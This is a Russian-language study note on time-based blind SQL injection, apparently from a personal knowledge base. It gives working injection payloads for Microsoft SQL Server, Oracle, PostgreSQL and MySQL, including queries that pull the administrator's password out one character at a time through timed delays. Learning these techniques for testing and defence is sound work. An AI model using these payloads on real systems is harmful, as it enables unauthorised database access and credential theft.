[[0Определение SQL Injection]] - карта раздела
## Оглавление
[[#Проверка на возможность использования]]
[[#Пример эксплуатации]]
[[#Разные БД]]
	[[#Oracle]]
	[[#Microsoft]]
	[[#PostgreSQL]]
	[[#MySql]]

---

> [!info] Определение
> Часто если приложение обнаруживает ошибки БД при выполнении SQL запроса, то в приложении не будет никакой разницы в ответе и наш метод условных ошибок не работает
> В такой ситуации следует воспользоваться внедрением в слепую которое будет вызывать временные задержки, в зависимости от того будет ли введенное условие истинным или ложным. Так как SQl-запросы обрабатываются в приложении синхронно задержка выполнения запроса приводит к задержке HTTP ответа. Это позволяет определить истинность введеного условия на основе времени затраченного на получение HTTP ответа


#### Проверка на возможность использования
Техники для отображения этой инъекции зависят от типа базы данных которую используют. Например в Microsoft SQL Server мы можем использовать условие чтобы протестировать задержку 
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- не сработает потому что условие ложно
'; IF (1=1) WAITFOR DELAY '0:0:10'-- сработает потому что условие истинно
```

#### Пример эксплуатации
когда мы можем проверять символы по одному за раз
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
> [!warning] ВАЖНО!
> Существуют различные способы инициирования временных задержек для разных типов баз данных применяются разные методы

#### Разные БД проверка и условия
Ниже приведены примеры запросов которые вызывают безусловную(всегда) задержку в 10 секунд
###### Oracle
Условие проверки 
```sql
dbms_pipe.receive_message(('a'),10)
BEGIN dbms_pipe.receive_message('a',10); END; 
======================
' OR 1=1; BEGIN dbms_pipe.receive_message('a',10); END;--  в инъекции
```
Пример эксплуатации
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
=====================
SELECT CASE WHEN (SUBSTR(password, 1, 1))='a' THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
###### Microsoft
Условие проверки
```sql
WAITFOR DELAY '00:00:10';-- 
IF (1=1) WAITFOR DELAY '00:00:10';-- 
```
Пример эксплуатации
```sql
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
======================
IF (SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a')
    WAITFOR DELAY '00:00:10';--
```
###### PostgreSQL
Условие проверки
```sql
SELECT pg_sleep(10);
=====================
'; SELECT pg_sleep(10)-- 
```
Пример эксплуатации
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
=================
'; SELECT CASE 
     WHEN SUBSTRING((SELECT password FROM users WHERE username='administrator'), 2, 1) = 'a' 
     THEN pg_sleep(10) 
     ELSE pg_sleep(0) 
   END-- 
```
###### MySql
Проверка
```sql
SELECT SLEEP(10)
========================
' OR SLEEP(10)-- 

```
Пример эксплуатации
```sql
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
==================
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a', SLEEP(10), 'a')-- 
```



